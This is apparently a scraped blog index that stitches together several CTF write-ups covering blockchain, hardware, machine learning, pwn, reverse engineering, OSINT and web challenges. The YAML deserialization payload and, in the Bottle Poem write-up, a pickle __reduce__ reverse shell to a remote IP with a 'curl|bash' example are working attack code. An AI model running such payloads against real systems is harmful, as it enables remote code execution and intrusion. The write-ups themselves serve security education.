Through practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations. Can you use your software to find your way through the blocks?\nNote: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\nCategory: Blockchain\nDifficulty: Very Easy\nIn this blockchain challenge, we were provided with two smart contracts: Setup.sol and Unknown.sol. Our goal was to solve the challenge by interacting with the contracts and ensuring that the isSolved() function in the Setup contract returns true.\nThe Setup.sol contract is responsible for initializing the challenge and providing us with the necessary information to interact with the Unknown.sol contract. The Setup contract deploys an instance of the Unknown contract and exposes the isSolved() function, which checks if the updated variable in the Unknown contract is set to true.\nThe Unknown.sol contract contains a single function, updateSensors(uint256 version), which sets the updated variable to true if the provided version argument is equal to 10.\nTo solve the challenge, we needed to call the updateSensors function in the Unknown contract with the correct version 10. To do this, we used the web3.py library to interact with the blockchain and the smart contracts.

Our mission is identify which device is captured and how to decode the signal to decrypt the communication.\nSolution Method We use Logic 2 to open this file, then receive this:\nThere is only one channel with signals so probably we are talking about UART protocol. For doing that, first we have to calculate the baud rate (bit/s).\nTo calculate the baud rate in this signal we zoom into the very first signal and see the minimun period of the signal. We can see that the smallest period between two high values is 8.68us. So, 1 bit needs at least 8.68us to be transfered. The baud rate therefore must be around 115200 (bit/s). Let’s configure the analyzer with this value:\nResults The flag is showed at the terminal, after correctly analyze the signal:\nFlag is: HTB{547311173_n37w02k_c0mp20m153d}\nSecret Code Given zip: Get it here!\nDescription: To gain access to the tomb containing the relic, you must find a way to open the door.

The desert was vast and unforgiving, and the harsh conditions would put her cyborg body to the test. Pandora started by collecting data about the temperature and humidity levels in the desert. She used a scatter plot in an Orange Workspace file to visualize this data and identified the areas where the temperature was highest and the humidity was lowest. Using this information, she reconfigured her sensors to better withstand the extreme heat and conserve water. But, a second look at the data revealed something otherwordly, it seems that the relic’s presence beneath the surface has scarred the land in a very peculiar way, can you see it?\nCategory: Machine Learning\nIn this challenge, we embarked on a quest to find an ancient alien relic hidden beneath the desert, following the footsteps of the cyborg Pandora. The task involved analyzing temperature and humidity data and uncovering peculiar patterns that hinted at the relic’s presence.\nTo begin the analysis, we downloaded and installed the Orange data mining tool, which is an open-source data visualization and analysis tool for data scientists. You can download it here: https://orange.biolab.si/download/\nAfter installing Orange, we opened the tool and loaded the analysis.ows file. We then imported the point.csv file into the Orange workspace by adding the “File” widget and selecting the point.csv file from our computer. Next, we created a scatter plot to visualize the data. We added the “Scatter Plot” widget from “Visualize” panel to the workspace and connected it to the “File” widget.\nBy viewing the “Scatter Plot”, we got the flag:\nFlag is: HTB{sc4tter_pl0ts_4_th3_w1n}\nMysterious Learnings Given zip: Get it here!\nDescription: One day the archeologist came across a strange metal plate covered in uncommon hieroglyphics.

This could only lead him in him wanting to learn more…\nCategory: Machine Learning\nIn this challenge, we were given an H5 file containing a pre-trained machine learning model. Our task was to analyze the model and extract a hidden flag.\nH5 file format, also known as Hierarchical Data Format (HDF5), is a versatile data model that can store large amounts of data efficiently. It is widely used in scientific research and engineering for storing and managing data. The format organizes data hierarchically and enables fast I/O operations.\nTo solve this challenge, we first needed to load the model from the H5 file and display its summary. We used TensorFlow and Keras libraries to achieve this. Here is the Python script:\nimport tensorflow as tf from tensorflow import keras # Load the model from the HDF5 file model = keras.models.load_model(\u0026#39;alien.h5\u0026#39;) # Display the model\u0026#39;s summary model.summary() We noticed a few strings in the layer names that seemed to be part of the flag.

Our goal is to execute the circuit and extract the flag, which is encoded in the most frequent bitstring resulting from the measurement of the quantum circuit.\nHere’s a brief write-up of the steps taken to solve this challenge:\nWe start by reading the OpenQASM code from the file named ‘quantum_artifact.qasm’ and store it as a string.\nNext, we use Qiskit, a Python library for quantum computing, to convert the OpenQASM code into a QuantumCircuit object.\nWe set up a quantum simulator using Qiskit’s Aer module, which allows us to simulate quantum circuits on classical computers.\nWe transpile the circuit, optimizing it for the simulator.\nWe execute the transpiled circuit on the simulator with 1024 shots, meaning the circuit is run 1024 times, and store the result.\nFrom the result, we extract the counts, which is a dictionary containing the frequency of each bitstring.\nWe iterate through the counts and find the most frequent bitstring, which is the binary representation of our flag.\nWe convert the most frequent bitstring to a text string by splitting it into groups of 8 bits (1 byte) and using the int() and chr() functions to convert …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"d676d190107cd280d7490463c331b9fb","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-ml/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-ml/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Machine Learning category.","tags":["ctf","writeup","machine learning","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Machine Learning","type":"blog"},{"authors":["FazeCT","Lê Hoàng","Lio"],"categories":null,"content":" Table of Contents Persistence Hijack Restricted Remote computation Janken nehebkaus trap The Chasm’s Crossing Conundrum Original Posts Persistence Description: Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom.

To provide some context, serialization is the process of storing an object, such as an array or class, in a database for later retrieval. When the application needs to access the object, it unserializes it, or loads it from the database using a function. This can improve the efficiency of Object-Oriented Programming.\nIt is important to note, however, that serialized objects should not be vulnerable to manipulation by users. If a user creates a malicious object, it could execute unwanted code. This challenge illustrates this point by presenting us with a serialized object and its corresponding base64 encoding. This is just one example of how serialized objects can be used, and it is essential to be aware of their potential risks.\nLet’s take a look at the next options. The application is requesting a base64 encoded string of a serialized object.\nUpon examining the serialized object provided by the application, I have determined that it is a YAML-formatted Python serialized object. This article serves as an excellent illustration of how attackers can leverage YAML-based exploits to execute arbitrary code.\nHere is the script to generate a serialized object.\nimport yaml import os import base64 class Test(object): def __reduce__(self): return (os.system, (\u0026#39;sh\u0026#39;,)) serialized_data = yaml.dump(Test()) # serializing data print(base64.b64encode(serialized_data.encode()).decode()) Let’s grab the result and throw it to the application.\nFlag is: HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}\nRestricted Given file: Get it here!\nDescription: You ’re still trying to collect information for your research on the alien relic.

All needed files will be given in the write-ups.\nCategory: Binary Exploitation/Pwnable\nDifficulty: Very Easy\nWe are given a binary, a C file and a netcat server to answer some questions.\nFrom the netcat, we are given some informations about the binary that we will going to work with.\nWhen compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created. The flags added when compiling can affect the binary in various ways, like the protections. Another thing affected can be the architecture and the way it\u0026#39;s linked. If the system in which the challenge is compiled is x86_64 and no flag is specified, the ELF would be x86-64 / 64-bit. If it\u0026#39;s compiled with a flag to indicate the system, it can be x86 / 32-bit binary. To reduce its size and make debugging more difficult, the binary can be stripped or not stripped. Dynamic linking: A pointer to the linked file is included in the executable, and the file contents are not included at link time. These files are used when the program is run. Static linking: The code for all the routines called by your program becomes part of the executable file. Stripped: The binary does not contain debugging information. Not Stripped: The binary contains debugging information. The most common protections in a binary are: Canary: A random value that is generated, put on the stack, and checked before that function is left again. If the canary value is not correct-has been changed or overwritten, the application will immediately stop. NX: Stands for non-executable segments, meaning we cannot write and execute code on the stack. PIE: Stands for Position Independent Executable, which randomizes the base address of the binary as it tells the loader which virtual address it should use. RelRO: Stands for Relocation Read-Only. The headers of the binary are marked as read-only. Run the \u0026#39;file\u0026#39; command in the terminal and \u0026#39;checksec\u0026#39; inside the debugger.

The output of \u0026#39;checksec\u0026#39; command: gef➤ checksec Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial We are able to answer some first questions using these informations.\nAfter answering these questions correctly, we are provided with more informations about the binary.\nGreat job so far! Now it\u0026#39;s time to see some C code and a binary file. In the pwn_questionnaire.zip there are two files: 1. test.c 2. test The \u0026#39;test.c\u0026#39; is the source code and \u0026#39;test\u0026#39; is the output binary. Let\u0026#39;s start by analyzing the code. First of all, let\u0026#39;s focus on the \u0026#39;#include \u0026lt;stdio.h\u0026gt;\u0026#39; line. It includes the \u0026#39;stdio.h\u0026#39; header file to use some of the standard functions like \u0026#39;printf()\u0026#39;. The same principle applies for the \u0026#39;#include \u0026lt;stdlib.h\u0026gt;\u0026#39; line, for other functions like \u0026#39;system()\u0026#39;. Now, let\u0026#39;s take a closer look at: void main(){ vuln(); } By default, a binary file starts executing from the \u0026#39;main()\u0026#39; function. In this case, \u0026#39;main()\u0026#39; only calls another function, \u0026#39;vuln()\u0026#39;. The function \u0026#39;vuln()\u0026#39; has 3 lines. void vuln(){ char buffer[0x20] = {0}; fprintf(stdout, \u0026#34;\\nEnter payload here: \u0026#34;); fgets(buffer, 0x100, stdin); } The first line declares a 0x20-byte buffer of characters and fills it with zeros. The second line calls \u0026#39;fprintf()\u0026#39; to print a message to stdout. Finally, the third line calls \u0026#39;fgets()\u0026#39; to read 0x100 bytes from stdin and store them to the aformentioned buffer. Then, there is a custom \u0026#39;gg()\u0026#39; function which calls the standard \u0026#39;system()\u0026#39; function to print the flag. This function is never called by default. void gg(){ system(\u0026#34;cat flag.txt\u0026#34;); } Run the \u0026#39;man \u0026lt;function_name\u0026gt;\u0026#39; command to see the manual page of a standard function (e.g. man fgets). We are also able to answer some next questions using these informations.\nAfter answering these questions correctly, we are provided with MORE and MORE informations about the binary.\nExcellent!

Our input string s will be used to XOR with two lists, m1 and m2. We can use export data in IDA to dump out the contents of m1 and m2, as shown below (do the same for m2).\nWe also know that after the first XOR, s needs to be equal to t (which we can get from the memory, too). Then we can reverse XOR to find s, and the algorithm looks like this.\nt[i] ^ m1[i] = s[i % 8] Since after the check, we continue to XOR m2 with the modified s (which should be equal to t after the memcmp), we get the algorithm to print out our flag.\nt[i] ^ m2[i] = flag[i] We can use this Python script to get the flag.\nm2 = [ 0x64, 0x1E, 0xF5, 0xE2, 0xC0, 0x97, 0x44, 0x1B, 0xF8, 0x5F, 0xF9, 0xBE, 0x18, 0x5D, 0x48, 0x8E, 0x91, 0xE4, 0xF6, 0xF1, 0x5C, 0x8D, 0x26, 0x9E, 0x2B, 0xA1, 0x02, 0xF7, 0xC6, 0xF7, 0xE4, 0xB3, 0x98, 0xFE, 0x57, 0xED, 0x4A, 0x4B, 0xD1, 0xF6, 0xA1, 0xEB, 0x09, 0xC6, 0x99, 0xF2, 0x58, 0xFA, 0xCB, 0x6F, 0x6F, 0x5E, 0x1F, 0xBE, 0x2B, 0x13, 0x8E, 0xA5, 0xA9, 0x99, 0x93, 0xAB, 0x8F, 0x70, 0x1C, 0xC0, 0xC4, 0x3E, 0xA6, 0xFE, 0x93, 0x35, 0x90, 0xC3, 0xC9, 0x10, 0xE9] t = [0x2C,0x4A,0x0B7,0x99,0x0A3,0x0E5,0x70,0x78,0x93,0x6E,0x97,0x0D9,0x47,0x6D,0x38,0x0BD,0x0FF,0x0BB,0x85,0x99,0x6F,0xE1,0x4A,0x0AB,0x74,0x0C3,0x7B,0x0A8,0x0B2,0x9F,0x0D7,0x0EC,0x0EB,0x0CD,0x63,0x0B2,0x39,0x23,0x0E1,0x84,0x92,0x96,0x09,0x0C6,0x99,0x0F2,0x58,0x0FA,0x0CB,0x6F,0x6F,0x5E,0x1F,0x0BE,0x2B,0x13,0x8E,0x0A5,0x0A9,0x99,0x93,0x0AB,0x8F,0x70,0x1C,0x0C0,0x0C4,0x3E,0x0A6,0x0FE,0x93,0x35,0x90,0x0C3,0x0C9,0x10,0x0E9] for i in range(len(t)): print(end=chr(t[i] ^ m2[i])) Flag is: HTB{cr4ck1ng_0p3n_sh3ll5_by_th3_s34_sh0r3}\nHunting License Given file: Get it here!\nDescription: STOP!

It is time to find Who is the killer.\nCategory: OSINT\nFinding the location From the given image, I managed to have found the location on Google Maps at 41.154248, -8.682320.\nThen in the comment section of the location, I got the mentioned secret email, labeled noodlesareramhackers@gmail.com.\nGetting further informations I then sent an email to the email above, and got the next instructions.\nFinding the deleted tweet In the first challenge of the Osint Crime Confusion set (W is for Where), I found the instagram of a person named Heather James.\nThen from this person’s informations, I found the twitter account of University of Dutch ThE of Topics in Science.\nI then immediately knew we have to bring the account to the Wayback Machine to gain access to the deleted tweet. The email did mention about the tweet’s id (1612383535549059076), so we can paste this URL into the Wayback Machine: https://twitter.com/UThE_TS/status/1612383535549059076\nWe successfully gained access to the deleted tweet!\nExploring the killer’s GitHub From the email, we also know that we should continue searching in GitHub. Frankly enough, when I tried to search for “potatoes eating camels” in GitHub, this showed up:\nThe descriptions imply that the person is “still improving wiki”. We then head into the wiki of this repository to find out the end of our journey.\nConcatenate the first letters of the last 7 sentences of the poem, we have our flag for the challenge: idek{JULIANA_APOSIDM723489}.\nConclusion A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as using Wayback Machine or finding locations on Google Maps.\n","date":1673841054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673841054,"objectID":"52c028b7047c41e2b3988f4917b783fa","permalink":"https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/","publishdate":"2023-01-16T03:50:54Z","relpermalink":"/blog/fazect/idekctf2022_osintcrime3/","section":"blog","summary":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3.","tags":["ctf","writeup","osint","idekctf-2022"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" Table of Contents Introduction Static Analysis Reaching case 14 Reaching case 1 Patch the binary Result Introduction Given binary: Get it here!\nDescription: If you can make the program runs faster, you’ll get the flag!\nCategory: Reverse Engineering\nStatic Analysis The challenge provides us with a single binary, named slow.exe. By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code.\nAnalyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below.\nint __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh] int v5[45]; // [esp+8h] [ebp-B8h] BYREF v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it.\nint __cdecl sub_4013B0(_DWORD *a1) { int result; // eax int v2; // eax int v3; // [esp+4h] [ebp-64h] ... snip int v37; // [esp+64h] [ebp-4h] int v38; // [esp+64h] [ebp-4h] while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\u0026#34;RESULT: %d\\n\u0026#34;, v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } It is easy to observe that only case 1 and case 14 involve calling other functions.\nTo be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog.\nReaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow.\nint __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF char Buffer; // [esp+110h] [ebp-124h] BYREF _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF char v5[32]; // [esp+210h] [ebp-24h] BYREF qmemcpy(v5, \u0026#34;Áõ\u0026#34;, 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026amp;Buffer, \u0026#34;%d\u0026#34;, 55 * a1); sub_401160(v5, v2, 30, \u0026amp;Buffer, \u0026amp;v4[strlen(\u0026amp;Buffer)] - v4); return sub_401040(\u0026#34;flag is: %s\u0026#34;, (char)v2); } The function receives our modified variable Block, then uses it to produce our flag.\nReaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.\nint __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h] v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag.\nPatch the binary So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part.\nmov ecx, [ebp+arg_0] mov edx, [ecx+10h] sub edx, 1 mov eax, [ebp+arg_0] mov [eax+10h], edx mov ecx, [ebp+var_10] push ecx mov edx, [ebp+var_C] push edx call sub_401110 add esp, 8 mov [ebp+var_58], eax mov eax, [ebp+arg_0] Instead of calling sub_401110, we should patch the program to directly calculates ecx + edx then assigns it into eax. We find out that the opcode of call sub_401110 is E8 77 FC FF FF.\nUsing IDA Pro integrated settings, which can be found at Options \u0026gt; Generals \u0026gt; Number of Opcode bytes (non-graph) set to a large enough number, we can view each instruction’s opcode.\nWith pwntools library, we also find out the opcode for add ecx, edx and move eax, ecx is 01 D1 and 89 C8 using this script written in Python below.\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; print(asm(\u0026#39;add ecx, edx\u0026#39;)) print(asm(\u0026#39;mov eax, ecx\u0026#39;)) It is now time to patch the binary. Use any hex editor of your choice to patch the binary, here I use IDA Pro’s integrated hex view to patch the binary.\nChange E8 77 FC FF FF to 01 D1 89 C8 90 using any hex editor of your choice (here 90 corresponds to the NOP …","date":1673624694,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673624694,"objectID":"40a209ad7f2b9aede0004e8de94746bc","permalink":"https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/","publishdate":"2023-01-13T16:17:00Z","relpermalink":"/blog/fazect/isitdtu-2022-slow/","section":"blog","summary":"An in-depth writeup on ISITDTU CTF 2022 Finals - Slow.","tags":["ctf","writeup","re","isitdtu-2022"],"title":"ISITDTU CTF 2022 Finals - Slow","type":"blog"},{"authors":["hdthinh1012"],"categories":null,"content":" Table of Contents Problem statement Basic Python Bottle Pickle exploit The exercise step Generate cookie Reference Links Problem statement Author hints that flag is executable\nThe website is vulnerable to directory traversal Pick /etc/self/procline to get the start application command So the application source is located at /app/app.py from bottle import route, run, template, request, response, error from config.secret import sekai import os import re @route(\u0026#34;/\u0026#34;) def home(): return template(\u0026#34;index\u0026#34;) @route(\u0026#34;/show\u0026#34;) def index(): response.content_type = \u0026#34;text/plain; charset=UTF-8\u0026#34; param = request.query.id if re.search(\u0026#34;^../app\u0026#34;, param): return \u0026#34;No!!!!\u0026#34; requested_path = os.path.join(os.getcwd() + \u0026#34;/poems\u0026#34;, param) try: with open(requested_path) as f: tfile = f.read() except Exception as e: return \u0026#34;No This Poems\u0026#34; return tfile @error(404) def error404(error): return template(\u0026#34;error\u0026#34;) @route(\u0026#34;/sign\u0026#34;) def index(): try: session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} response.set_cookie(\u0026#34;name\u0026#34;, session, secret=sekai) return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) except: return \u0026#34;pls no hax\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: os.chdir(os.path.dirname(__file__)) run(host=\u0026#34;0.0.0.0\u0026#34;, port=8080) If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap\nThe hint said flag is executable, meaning RCE is possible.\nBasic Let’s have a look at Python Bottle\nPython Bottle Bottle signed cookie Bottle first:\npickle.dumps([name, value], -1) then base64 encode → encoded hmac encrypt the secret seperately then base64 encode → signature add ‘!’ at the first char and ‘?’ in between signature Cookie format: !secret_hmac_base64==?pickle_name_value_base64==\nBottle verify cookie get_cookie:\n… base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1)) We have controlled the value input through cookie\nPickle exploit Ref Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in.

STOP pickle still allows you to define a custom behavior for the pickling process for your class instances.\nThe __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). […] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […] So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.\nSo if any value in the array pass into pickle.dumps is an instance containing __reduce__(…) function, that reduce will be executed when calling pickle.loads(…). And the __reduce__(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.\nSo by implement reduce method that return (eval, (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;curl xxx|bash\u0026#34;)\u0026#39;,)) , we can execute code on the server.\nThe exercise step Generate cookie Add an class definition with __reduce__ method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.\nclass RCE: def __reduce__(self): # 14.186.174.164 cmd = (\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 14.186.174.164 55555 \u0026gt; /tmp/f\u0026#39;) return os.system, ((f\u0026#34;\u0026#34;\u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;14.186.174.164\u0026#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34;),) # Test @route(\u0026#34;/sign\u0026#34;) def index(): session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) print(session[\u0026#34;name\u0026#34;]) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: objWithReduce = RCE() session = …","date":1673481600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673481600,"objectID":"2256b16fb9515e2dc5aa0a85914de4e5","permalink":"https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/","publishdate":"2023-01-12T00:00:00Z","relpermalink":"/blog/duti/sekai-ctf-2022-bottle-poem/","section":"blog","summary":"Deserialization attack with Python Bottle.","tags":["ctf","writeup","web exploitation"],"title":"Sekai CTF 2022 Bottle Poem","type":"blog"},{"authors":[],"categories":null,"content":" ","date":1666893600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1666893600,"objectID":"8e723f582259e44e14817f259e85b85a","permalink":"https://blog.bkisc.com/event/2022-10-27-hieupc-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-10-27-hieupc-talk/","section":"event","summary":"Anh Ngô Minh Hiếu, hiện là chuyên viên kỹ thuật tại Trung tâm Giám sát và An toàn không gian mạng Quốc gia (NCSC), sẽ có những chia sẻ về kinh nghiệm của bản thân trong việc ngăn chặn các thông tin lừa đảo, giả mạo, không chính thống.
